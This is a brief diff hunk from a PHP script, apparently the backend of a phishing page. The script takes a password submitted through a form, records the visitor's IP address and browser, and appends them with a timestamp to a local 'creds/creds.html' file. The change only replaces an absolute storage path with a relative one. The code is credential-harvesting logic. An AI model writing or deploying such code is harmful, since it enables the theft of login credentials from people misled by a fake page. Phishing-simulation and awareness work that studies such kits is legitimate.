@@ -5,7 +5,7 @@ $pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $browser = $_SERVER['HTTP_USER_AGENT'];
 date_default_timezone_set("America/Denver");
-$myfile = fopen("/var/www/html/creds/creds.html", "a") or die("Unable to open file!");
+$myfile = fopen("./creds/creds.html", "a") or die("Unable to open file!");
 fwrite($myfile,date("Y-m-d h:i:sa"));
 fwrite($myfile,": ".$webpage);
 fwrite($myfile,": ".$ip);
